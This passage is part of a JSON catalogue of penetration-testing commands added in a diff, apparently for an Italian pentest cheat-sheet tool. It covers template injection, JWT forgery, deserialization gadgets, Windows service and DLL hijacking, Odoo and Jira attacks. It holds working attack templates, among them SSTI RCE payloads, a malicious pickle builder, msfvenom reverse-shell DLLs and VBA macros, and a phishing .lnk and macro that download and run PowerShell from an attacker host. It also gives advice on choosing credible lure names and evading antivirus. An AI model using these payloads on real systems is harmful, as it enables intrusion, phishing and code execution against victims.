+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "param",
+        "label": "Parametro",
+        "placeholder": "name"
+      },
+      {
+        "key": "cmd",
+        "label": "Comando",
+        "placeholder": "id"
+      }
+    ],
+    "variants": [
+      {
+        "id": "jinja2",
+        "label": "Jinja2 (Python)",
+        "template": "{{ cycler.__init__.__globals__.os.popen('<cmd>').read() }}",
+        "description": "Risale da un oggetto builtin ai globals di Python e chiama `os.popen`. Alternativa classica: `{{ config.__class__.__init__.__globals__['os'].popen('<cmd>').read() }}`."
+      },
+      {
+        "id": "twig",
+        "label": "Twig (PHP)",
+        "template": "{{ ['<cmd>']|filter('system') }}",
+        "description": "Usa il filtro `system` sul comando. Su versioni vecchie: `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('<cmd>')}}`."
+      },
+      {
+        "id": "freemarker",
+        "label": "Freemarker (Java)",
+        "template": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"<cmd>\") }",
+        "description": "Istanzia la utility Execute di Freemarker ed esegue il comando lato JVM."
+      },
+      {
+        "id": "smarty",
+        "label": "Smarty (PHP)",
+        "template": "{system('<cmd>')}",
+        "description": "Smarty espone direttamente `system`. Se filtrato, prova `{php}system('<cmd>');{/php}` sulle versioni datate."
+      },
+      {
+        "id": "tplmap",
+        "label": "tplmap (automatico)",
+        "template": "tplmap -u 'http://<ip>/?<param>=*' --os-cmd '<cmd>'",
+        "description": "Rileva il motore e sfrutta l'SSTI in automatico. Il `*` marca il punto di iniezione. Alternativa moderna: SSTImap."
+      }
+    ]
+  },
+  {
+    "id": "jwt-attacks",
+    "name": "JWT — manipolazione token",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "JWT",
+    "description": "Un JSON Web Token è firmato ma leggibile: si decodifica in base64 per vedere claim e algoritmo, poi si attacca la firma. `alg:none` prova a farsi accettare un token senza firma, il brute force cerca il segreto HS256 debole, la confusion RS256->HS256 rifirma il token con la chiave pubblica del server usata come segreto HMAC.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "jwt",
+      "token",
+      "web"
+    ],
+    "template": "jwt_tool <jwt>",
+    "params": [
+      {
+        "key": "jwt",
+        "label": "Token JWT",
+        "placeholder": "eyJ..."
+      },
+      {
+        "key": "wordlist",
+        "label": "Wordlist",
+        "placeholder": "/usr/share/wordlists/rockyou.txt"
+      }
+    ],
+    "variants": [
+      {
+        "id": "decode",
+        "label": "Decodifica",
+        "template": "jwt_tool <jwt>\n# oppure a mano:\necho '<jwt>' | cut -d. -f1,2 | tr '.' '\\n' | base64 -d 2>/dev/null",
+        "description": "Mostra header e payload in chiaro. Guarda `alg`, i claim di ruolo/utente e la scadenza per capire cosa manomettere."
+      },
+      {
+        "id": "none",
+        "label": "alg:none",
+        "template": "jwt_tool <jwt> -X a",
+        "description": "Forgia una variante con `alg:none` e firma vuota. Se il server la accetta, puoi impostare qualsiasi claim (es. `admin:true`)."
+      },
+      {
+        "id": "brute",
+        "label": "Brute secret HS256",
+        "template": "jwt_tool <jwt> -C -d <wordlist>\n# oppure hashcat:\nhashcat -m 16500 <jwt> <wordlist>",
+        "description": "Cerca il segreto HMAC con un dizionario. Trovato il segreto, si rifirma il token con qualsiasi claim."
+      },
+      {
+        "id": "confusion",
+        "label": "RS256 -> HS256",
+        "template": "jwt_tool <jwt> -X k -pk public.pem",
+        "description": "Confusion di algoritmo: rifirma il token in HS256 usando la chiave pubblica RSA del server come segreto. Serve avere `public.pem` (spesso su `/jwks.json` o estraibile)."
+      }
+    ]
+  },
+  {
+    "id": "deserialization",
+    "name": "Insecure Deserialization — gadget",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "Deserialization",
+    "description": "Quando un'app deserializza dati controllati dall'utente si può forgiare un oggetto che, ricostruito, esegue codice. Ogni stack ha il suo generatore di gadget chain: ysoserial per Java, phpggc per PHP, ysoserial.net per il ViewState .NET, un payload pickle per Python. Riconosci la tecnologia dai token (`rO0` = Java base64, `Tzo...` = PHP `O:`).",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "deserialization",
+      "ysoserial",
+      "rce"
+    ],
+    "template": "java -jar ysoserial.jar CommonsCollections5 '<cmd>' | base64 -w0",
+    "params": [
+      {
+        "key": "cmd",
+        "label": "Comando",
+        "placeholder": "id"
+      }
+    ],
+    "variants": [
+      {
+        "id": "java",
+        "label": "Java (ysoserial)",
+        "template": "java -jar ysoserial.jar CommonsCollections5 '<cmd>' | base64 -w0",
+        "description": "Genera una gadget chain Java. Prova le catene una a una (CommonsCollections1-7, CommonsBeanutils1) in base alle librerie presenti. Token Java serializzato base64 = inizia con `rO0`."
+      },
+      {
+        "id": "php",
+        "label": "PHP (phpggc)",
+        "template": "phpggc -u Monolog/RCE1 system '<cmd>'",
+        "description": "Genera un payload PHP serializzato per una gadget chain nota (qui Monolog). `-l` elenca tutte le catene disponibili per il framework in uso."
+      },
+      {
+        "id": "net",
+        "label": ".NET (ysoserial.net)",
+        "template": "ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c '<cmd>'",
+        "description": "Genera payload .NET, tipico per ViewState di ASP.NET o formatter Json.Net/BinaryFormatter. Per il ViewState serve anche la machineKey."
+      },
+      {
+        "id": "python",
+        "label": "Python (pickle)",
+        "template": "python3 -c \"import pickle,os,base64;print(base64.b64encode(pickle.dumps(type('E',(object,),{'__reduce__':lambda s:(os.system,('<cmd>',))})())).decode())\"",
+        "description": "Costruisce un pickle malevolo che esegue il comando alla deserializzazione. Applicabile a endpoint che fanno `pickle.loads` su input non fidato."
+      }
+    ]
+  },
+  {
+    "id": "graphql-enum",
+    "name": "GraphQL — introspection & abuse",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "GraphQL",
+    "description": "Un endpoint GraphQL espone spesso l'intero schema tramite l'introspection query: da lì si scoprono tutti i tipi, i campi e le mutation disponibili, comprese quelle non pensate per l'utente. Se l'introspection è disabilitata, `graphw00f` ne fa il fingerprint e `clairvoyance` ricostruisce lo schema a forza di query.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "graphql",
+      "introspection",
+      "web"
+    ],
+    "template": "curl -s -X POST http://<ip>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "introspection",
+        "label": "Introspection",
+        "template": "curl -s -X POST http://<ip>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'",
+        "description": "Dumpa lo schema completo. Cerca tipi come `User` e mutation come `login`/`register` per capire la superficie d'attacco. Formatta l'output con `| jq`."
+      },
+      {
+        "id": "query",
+        "label": "Query dati",
+        "template": "curl -s -X POST http://<ip>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{users{id username password email}}\"}'",
+        "description": "Interroga direttamente i campi scoperti. Molte API GraphQL espongono più dati del previsto perché l'autorizzazione è per-campo e spesso incompleta."
+      },
+      {
+        "id": "fingerprint",
+        "label": "Fingerprint (introspection off)",
+        "template": "graphw00f -d -t http://<ip>/graphql",
+        "description": "Identifica l'implementazione GraphQL anche con introspection disabilitata. Poi `clairvoyance` può ricostruire lo schema a forza di suggerimenti d'errore."
+      }
+    ]
+  },
+  {
+    "id": "git-dumper",
+    "name": ".git esposto — dump sorgenti",
+    "category": "vuln-analysis",
+    "subcategory": "web-app-testing",
+    "group": "Source Leak",
+    "description": "Una cartella `.git` lasciata nel web root permette di ricostruire l'intero codice sorgente dell'applicazione, inclusi i segreti committati per errore. Prima si verifica l'esposizione, poi `git-dumper` scarica e ricostruisce il repository, infine si scava nella history dei commit dove finiscono password e chiavi API poi rimosse.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "git",
+      "source-leak",
+      "secrets"
+    ],
+    "template": "git-dumper http://<ip>/.git/ ./loot-git",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "check",
+        "label": "Check esposizione",
+        "template": "curl -s http://<ip>/.git/HEAD\ncurl -s http://<ip>/.git/config",
+        "description": "Una risposta con `ref: refs/heads/...` conferma che la `.git` è servita e scaricabile. Vale la pena controllare anche `.svn/`, `.hg/` e i backup `.bak`/`.zip`."
+      },
+      {
+        "id": "dump",
+        "label": "Dump repository",
+        "template": "git-dumper http://<ip>/.git/ ./loot-git",
+        "description": "Scarica e ricostruisce il repo in `./loot-git`. Se git-dumper manca: `pip install git-dumper` (o gitdumper.sh di GitTools)."
+      },
+      {
+        "id": "secrets",
+        "label": "Cerca segreti nella history",
+        "template": "cd ./loot-git && git log --oneline --all\ngit log -p --all | grep -iE 'password|passwd|secret|api[_-]?key|token'",
+        "description": "Scorre tutti i commit: le credenziali spesso vengono committate e poi 'rimosse', ma restano nella history. `git show <commit>` apre uno specifico cambiamento."
+      }
+    ]
+  },
+  {
+    "id": "win-service-perms",
+    "name": "Servizi Windows — permessi deboli",
+    "category": "privesc",
+    "subcategory": "vuln-services",
+    "group": "Service Abuse",
+    "description": "Se un utente ha il diritto di modificare la configurazione di un servizio (SERVICE_CHANGE_CONFIG) o di scrivere sul suo eseguibile, può dirottare il servizio per eseguire un comando come l'account che lo avvia, di solito SYSTEM. `accesschk` trova i servizi vulnerabili, `sc config` ne riscrive il binPath e il riavvio del servizio scatena l'esecuzione.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "service",
+      "accesschk",
+      "privesc"
+    ],
+    "template": ".\\accesschk.exe /accepteula -uwcqv <user> *",
+    "params": [
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "jdoe"
+      },
+      {
+        "key": "svc",
+        "label": "Servizio",
+        "placeholder": "VulnSvc"
+      }
+    ],
+    "variants": [
+      {
+        "id": "enum",
+        "label": "Enum servizi scrivibili",
+        "template": ".\\accesschk.exe /accepteula -uwcqv <user> *\n# nativo, senza accesschk:\nGet-CimInstance win32_service | ? {$_.StartName -like '*LocalSystem*'} | select Name,PathName",
+        "description": "Elenca i servizi su cui l'utente ha permessi di scrittura (`SERVICE_CHANGE_CONFIG`/`WRITE_DAC`). Un servizio modificabile che gira come SYSTEM è la via diretta a SYSTEM."
+      },
+      {
+        "id": "reconfig",
+        "label": "Dirotta binPath",
+        "template": "sc config <svc> binPath= \"C:\\Windows\\Temp\\rev.exe\"\nsc stop <svc>\nsc start <svc>",
+        "description": "Riscrive l'eseguibile del servizio con il proprio payload, poi lo riavvia per eseguirlo come SYSTEM. Ripristina il binPath originale a fine attività."
+      },
+      {
+        "id": "binexe",
+        "label": "Sovrascrivi l'eseguibile",
+        "template": "# se hai permesso di scrittura sul .exe del servizio (non serve sc config):\ncopy /Y C:\\Windows\\Temp\\rev.exe \"C:\\Path\\To\\service.exe\"\nsc stop <svc> & sc start <svc>",
+        "description": "Quando è l'eseguibile a essere scrivibile, lo si sostituisce direttamente. Il riavvio del servizio (o un reboot) esegue il payload come SYSTEM."
+      }
+    ],
+    "refs": [
+      {
+        "label": "HackTricks — Windows services",
+        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
+      }
+    ]
+  },
+  {
+    "id": "win-dll-hijack",
+    "name": "DLL Hijacking (Windows)",
+    "category": "privesc",
+    "subcategory": "vuln-services",
+    "group": "DLL Hijacking",
+    "description": "Un servizio o un'applicazione privilegiata che cerca una DLL in una cartella scrivibile, o secondo un ordine di ricerca prevedibile, può caricare una DLL malevola. Con Procmon si individua la DLL 'NOT FOUND' in un path scrivibile, si genera una DLL con lo stesso nome e il caricamento la esegue con i privilegi del processo.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "dll",
+      "hijacking",
+      "privesc"
+    ],
+    "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o <dll>.dll",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "443"
+      },
+      {
+        "key": "dll",
+        "label": "Nome DLL",
+        "placeholder": "hijackme"
+      }
+    ],
+    "variants": [
+      {
+        "id": "find",
+        "label": "Trova DLL mancanti",
+        "template": "# Procmon: filtro Result = NAME NOT FOUND, Path finisce con .dll, in una cartella scrivibile\n# check scrivibilità delle cartelle nel PATH:\nfor %A in (\"%PATH:;=\";\"%\") do @icacls %A 2>nul | findstr /i \"Everyone BUILTIN\\Users AUTORITA\"",
+        "description": "Individua le DLL cercate e non trovate in cartelle su cui l'utente può scrivere. Le cartelle scrivibili nel PATH di sistema sono candidati classici."
+      },
+      {
+        "id": "build",
+        "label": "Genera & piazza la DLL",
+        "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o <dll>.dll\n# copia la DLL col nome atteso nel path scrivibile, poi riavvia il servizio/app",
+        "description": "Crea la DLL malevola col nome esatto atteso e la piazza nel path individuato. Al successivo avvio del processo privilegiato la DLL viene caricata ed eseguita."
+      }
+    ]
+  },
+  {
+    "id": "win-autorun",
+    "name": "Autorun / AlwaysInstallElevated recheck",
+    "category": "privesc",
+    "subcategory": "vuln-services",
+    "group": "Autorun & Registry",
+    "description": "Windows esegue automaticamente programmi elencati in alcune chiavi di registro e cartelle di avvio. Se l'eseguibile puntato o la chiave stessa sono scrivibili da un utente non privilegiato, si sostituisce il binario per eseguire codice al login di un utente con più privilegi. Vanno controllati anche gli autorun di sistema, non solo quelli utente.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "autorun",
+      "registry",
+      "startup"
+    ],
+    "template": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "params": [],
+    "variants": [
+      {
+        "id": "enum",
+        "label": "Enum autorun",
+        "template": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n# con Sysinternals:\n.\\autorunsc.exe -a * -c -h",
+        "description": "Elenca i programmi eseguiti all'avvio. Annota il path di ciascun eseguibile per verificarne poi i permessi di scrittura."
+      },
+      {
+        "id": "writable",
+        "label": "Check scrivibilità",
+        "template": ".\\accesschk.exe /accepteula -wvu \"C:\\Path\\To\\autorun.exe\"\nicacls \"C:\\Path\\To\\autorun.exe\"",
+        "description": "Verifica se l'eseguibile di autorun è scrivibile dall'utente corrente. Se lo è, si sostituisce con un payload che parte al prossimo login privilegiato."
+      }
+    ]
+  },
+  {
+    "id": "autorecon",
+    "name": "AutoRecon — enum multi-thread",
+    "category": "info-gathering",
+    "subcategory": "active-recon",
+    "group": "TCP Scans",
+    "description": "AutoRecon lancia in parallelo una batteria di scansioni e di enumerazioni per servizio, salvando tutto in una struttura di cartelle ordinata per host e porta. È il modo veloce per partire su uno o più target: mentre analizzi i primi risultati, in background continua a girare nmap, enum web, SMB e altro. Utile all'inizio, non sostituisce l'enum manuale mirata.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "tcp"
+    ],
+    "tags": [
+      "autorecon",
+      "recon",
+      "enum"
+    ],
+    "template": "autorecon <ip>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Singolo host",
+        "template": "autorecon <ip>",
+        "description": "Enumerazione completa di un host: port scan, poi enum specifica per ogni servizio trovato. I risultati finiscono in `results/<ip>/`."
+      },
+      {
+        "id": "multi",
+        "label": "Più host",
+        "template": "autorecon -t targets.txt",
+        "description": "Enumera in parallelo tutti gli host elencati in `targets.txt`, uno per riga. Comodo su una subnet già ridotta agli host vivi."
+      },
+      {
+        "id": "fast",
+        "label": "Solo top ports",
+        "template": "autorecon <ip> --port-scans top-100-ports",
+        "description": "Versione più rapida che parte dalle prime 100 porte, utile quando il tempo è poco. Poi si può rilanciare con lo scan completo."
+      }
+    ]
+  },
+  {
+    "id": "client-macro",
+    "name": "Office — macro VBA malevola",
+    "category": "exploitation",
+    "subcategory": "client-side",
+    "group": "Office Macro",
+    "description": "Un documento Office con una macro VBA esegue codice quando la vittima abilita le macro. Si genera lo scheletro VBA con msfvenom, lo si incolla nell'editor macro (Alt+F11) di un .doc o .xls in vecchio formato binario, e si imposta l'auto-esecuzione con `AutoOpen`/`Document_Open`. Alla peggio la macro scarica ed esegue un secondo stadio.",
+    "platform": "windows",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "macro",
+      "vba",
+      "phishing",
+      "client-side"
+    ],
+    "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f vba -o macro.vba",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "443"
+      }
+    ],
+    "variants": [
+      {
+        "id": "msf",
+        "label": "Genera VBA (msfvenom)",
+        "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f vba -o macro.vba",
+        "description": "Produce il codice VBA da incollare nell'editor macro. Va salvato in formato .doc/.xls (macro-enabled) e serve un handler in ascolto. Auto-run tramite `Sub AutoOpen()` / `Sub Document_Open()`."
+      },
+      {
+        "id": "downloader",
+        "label": "Macro downloader",
+        "template": "# VBA minimale: scarica ed esegue un secondo stadio\n# Sub AutoOpen()\n#   Dim s: s = \"powershell -nop -w hidden -c \"\"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/a.ps1')\"\"\"\n#   CreateObject(\"WScript.Shell\").Run s, 0, False\n# End Sub",
+        "description": "Invece di embeddare lo shellcode, la macro tira giù ed esegue uno script PowerShell dal tuo server: payload più piccolo e più facile da modificare per l'evasione AV."
+      }
+    ]
+  },
+  {
+    "id": "client-lnk",
+    "name": ".lnk / .Library-ms — trigger",
+    "category": "exploitation",
+    "subcategory": "client-side",
+    "group": "Shortcut & Library",
+    "description": "File shortcut e libreria di Windows possono avviare comandi quando l'utente li apre o anche solo apre la cartella che li contiene. Un `.lnk` con target PowerShell esegue un downloader; un `.Library-ms` punta a una share WebDAV/SMB controllata dall'attaccante e, combinato con un secondo file, fa partire il payload. Tecnica tipica del phishing interno.",
+    "platform": "windows",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "smb",
+      "http"
+    ],
+    "tags": [
+      "lnk",
+      "library-ms",
+      "phishing",
+      "client-side"
+    ],
+    "template": "# PowerShell: crea un .lnk che lancia un downloader\n$w=New-Object -ComObject WScript.Shell\n$s=$w.CreateShortcut(\"$PWD\\invoice.lnk\")\n$s.TargetPath=\"powershell.exe\"\n$s.Arguments=\"-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/a.ps1')\"\n$s.Save()",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "lnk",
+        "label": ".lnk downloader",
+        "template": "$w=New-Object -ComObject WScript.Shell\n$s=$w.CreateShortcut(\"$PWD\\invoice.lnk\")\n$s.TargetPath=\"powershell.exe\"\n$s.Arguments=\"-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/a.ps1')\"\n$s.IconLocation=\"shell32.dll,70\"\n$s.Save()",
+        "description": "Crea uno shortcut con icona da documento che, all'apertura, esegue un downloader PowerShell. Va consegnato alla vittima (mail, share) con un nome credibile."
+      },
+      {
+        "id": "libraryms",
+        "label": ".Library-ms (WebDAV)",
+        "template": "# 1. avvia una share WebDAV anonima sul tuo host:\nwsgidav --host=0.0.0.0 --port=80 --root=./share --auth=anonymous\n# 2. crea un file .Library-ms che punta a \\\\<lhost>\\share (elemento simpleLocation/url;\n#    XML completo su PayloadsAllTheThings) e metti un .lnk dentro la share\n# 3. la vittima apre il .Library-ms, vede la share e lancia il .lnk al suo interno",
+        "description": "Apre una vista su una share remota controllata dall'attaccante: abbinato a un secondo file (es. un .lnk nella share) porta all'esecuzione. Base della catena vista in vari box HTB."
+      }
+    ]
+  },
+  {
+    "id": "odoo-enum",
+    "name": "Odoo — fingerprint & database",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "Odoo (ERP)",
+    "description": "Odoo è un ERP web modulare, esposto su `/web`. OdooMap lo riconosce e ne rivela versione, database esposti, stato della registrazione al portale ed endpoint accessibili. I nomi dei database sono case-sensitive ma spesso in minuscolo (nome azienda, `odoo`, `prod`, `test`): scoprire un database valido è il prerequisito per ogni attacco successivo, perché gli account sono legati al singolo database.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "odoo",
+      "odoomap",
+      "erp"
+    ],
+    "template": "odoomap -u https://<ip>",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Host",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "detect",
+        "label": "Fingerprint",
+        "template": "odoomap -u https://<ip>",
+        "description": "Identifica Odoo e ne stampa versione, database esposti ed endpoint (`/web`, `/shop`, `/forum`). La versione serve al CVE scanner."
+      },
+      {
+        "id": "dbnames",
+        "label": "Enum database",
+        "template": "odoomap -u https://<ip> -n -N db-names.txt",
+        "description": "Brute dei nomi database da wordlist. Punta su nomi aziendali e termini generici (`odoo`, `prod`, `test`), tutti in minuscolo."
+      },
+      {
+        "id": "cve",
+        "label": "CVE scanner",
+        "template": "odoomap -u https://<ip> --plugin cve-scanner",
+        "description": "Confronta la versione rilevata con l'NVD. `odoomap --list-plugins` elenca gli altri plugin disponibili."
+      }
+    ],
+    "refs": [
+      {
+        "label": "karrab7 — Pentesting Odoo with OdooMap",
+        "url": "https://karrab7.com/articles/Pentesting-Odoo-Applications-with-OdooMap"
+      }
+    ]
+  },
+  {
+    "id": "odoo-exploit",
+    "name": "Odoo — auth, master pw & dump",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "Odoo (ERP)",
+    "description": "Con un database noto si attaccano le credenziali, il master password e i dati. Il brute force prova utente/password sul database (gli account sono per-database). Il master password controlla la gestione dei database (creazione, backup, duplicazione, cancellazione): comprometterlo permette backup/restore arbitrari fino alla RCE. Post-auth si estraggono i modelli via XML-RPC/JSON-RPC dove i permessi sono mal configurati.",
+    "note": "# Credenziali di default\n`admin:admin` è il default di installazione (utente e spesso master password). Provalo prima del brute.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "odoo",
+      "odoomap",
+      "brute",
+      "rce"
+    ],
+    "template": "odoomap -u https://<ip> -D <db> -b --usernames users.txt --passwords passwords.txt",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Host",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "db",
+        "label": "Database",
+        "placeholder": "prod"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "admin"
+      },
+      {
+        "key": "password",
+        "label": "Password",
+        "ctx": "password",
+        "placeholder": "P@ssw0rd"
+      }
+    ],
+    "variants": [
+      {
+        "id": "brute",
+        "label": "Brute credenziali",
+        "template": "odoomap -u https://<ip> -D <db> -b --usernames users.txt --passwords passwords.txt",
+        "description": "Prova le combinazioni contro un database specifico (`-D`). Senza wordlist tenta le credenziali di default come `admin:admin`."
+      },
+      {
+        "id": "master",
+        "label": "Master password",
+        "template": "odoomap -u https://<ip> -M -p pass-list.txt",
+        "description": "Cracka il master password che governa la gestione dei database. Ottenuto, i backup/restore diventano una via alla RCE sul server."
+      },
+      {
+        "id": "extract",
+        "label": "Dump modelli",
+        "template": "odoomap -u https://<ip> -D <db> -U <user> -P <password> -d res.users,res.partner",
+        "description": "Esporta in JSON i modelli indicati (qui utenti e contatti). `-e` elenca i modelli accessibili, `-pe` mostra i permessi read/write/create/delete."
+      },
+      {
+        "id": "privesc",
+        "label": "Privesc (Odoo < 15)",
+        "template": "odoomap -u https://<ip> -D <db> -U <user> -P <password> --plugin old-odoo-privesc",
+        "description": "Sulle versioni precedenti alla 15.0 sfrutta una privilege escalation nota via ORM per passare ad amministratore dell'istanza."
+      }
+    ],
+    "refs": [
+      {
+        "label": "karrab7 — Pentesting Odoo with OdooMap",
+        "url": "https://karrab7.com/articles/Pentesting-Odoo-Applications-with-OdooMap"
+      }
+    ]
+  },
+  {
+    "id": "jira-enum",
+    "name": "Jira — versione, utenti & info leak",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "Jira (Atlassian)",
+    "description": "Jira espone diversi endpoint che, su versioni non aggiornate, perdono informazioni senza autenticazione. Il file `pom.xml` rivela la versione esatta (da cui i CVE applicabili), il group/user picker enumera tutti gli utenti, e i filtri/dashboard pubblici mostrano progetti e nomi interni. La versione ricavata qui guida la scelta dell'exploit.",
+    "note": "# Credenziali di default\n`admin:admin` è il default di molte installazioni Jira/Service Desk. Prova anche `admin:password` sulla pagina di login prima del brute.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "jira",
+      "atlassian",
+      "user-enum"
+    ],
+    "template": "curl -sk 'http://<ip>/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml' | grep -i version",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Host",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "version",
+        "label": "Versione (CVE-2019-8442)",
+        "template": "curl -sk 'http://<ip>/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml' | grep -i version\ncurl -sk 'http://<ip>/rest/api/2/serverInfo'",
+        "description": "Legge la versione dal pom.xml (path traversal pre-auth CVE-2019-8442) o da `serverInfo`. Da qui si scelgono i CVE applicabili."
+      },
+      {
+        "id": "userenum",
+        "label": "Enum utenti",
+        "template": "curl -sk 'http://<ip>/rest/api/latest/groupuserpicker?query=%25&maxResults=50000&showAvatar=true'\ncurl -sk 'http://<ip>/secure/ViewUserHover.jspa?username=admin'\ncurl -sk 'http://<ip>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin'",
+        "description": "Enumera tutti gli utenti tramite groupuserpicker (CVE-2019-8449), ViewUserHover (CVE-2020-14181) o QueryComponentRendererValue (CVE-2020-36289, unauth)."
+      },
+      {
+        "id": "infoleak",
+        "label": "Filtri, dashboard, progetti",
+        "template": "curl -sk 'http://<ip>/secure/ManageFilters.jspa?filterView=popular'\ncurl -sk 'http://<ip>/rest/api/2/dashboard?maxResults=100'\ncurl -sk 'http://<ip>/secure/QueryComponent!Default.jspa'",
+        "description": "Filtri e dashboard popolari, campi custom (CVE-2020-14179) e chiavi progetto (`/browse.<KEY>`, CVE-2020-14178) esposti senza login."
+      }
+    ],
+    "refs": [
+      {
+        "label": "pentest-book — Jira",
+        "url": "https://www.pentest-book.com/enumeration/webservices/jira"
+      },
+      {
+        "label": "Atlassian-Jira-pentesting (CVE list)",
+        "url": "https://github.com/UGF0aWVudF9aZXJv/Atlassian-Jira-pentesting"
+      }
+    ]
+  },
+  {
+    "id": "jira-exploit",
+    "name": "Jira — SSRF, RCE & path traversal",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "Jira (Atlassian)",
+    "description": "I CVE ad alto impatto di Jira: due SSRF (uno con bypass della validazione appendendo `@host`), una template injection che porta a RCE non autenticata, una path traversal che legge file arbitrari e una XSS nel Wallboard. Vanno provati in base alla versione ricavata in enumerazione, partendo da SSRF e RCE.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "jira",
+      "ssrf",
+      "rce",
+      "ssti"
+    ],
+    "template": "curl -sk 'http://<ip>/plugins/servlet/gadgets/makeRequest?url=https://<ip>:1337@<lhost>'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Host",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "cmd",
+        "label": "Comando",
+        "placeholder": "id"
+      },
+      {
+        "key": "target",
+        "label": "Target SSRF",
+        "placeholder": "169.254.169.254"
+      }
+    ],
+    "variants": [
+      {
+        "id": "ssrf-gadgets",
+        "label": "SSRF makeRequest (CVE-2019-8451)",
+        "template": "curl -sk 'http://<ip>/plugins/servlet/gadgets/makeRequest?url=https://<ip>:1337@<target>'",
+        "description": "SSRF con bypass della validazione: `@<target>` fa fetchare Jira verso l'host interno indicato. Utile per la metadata cloud (`169.254.169.254`) o servizi interni."
+      },
+      {
+        "id": "ssrf-oauth",
+        "label": "SSRF oauth (CVE-2017-9506)",
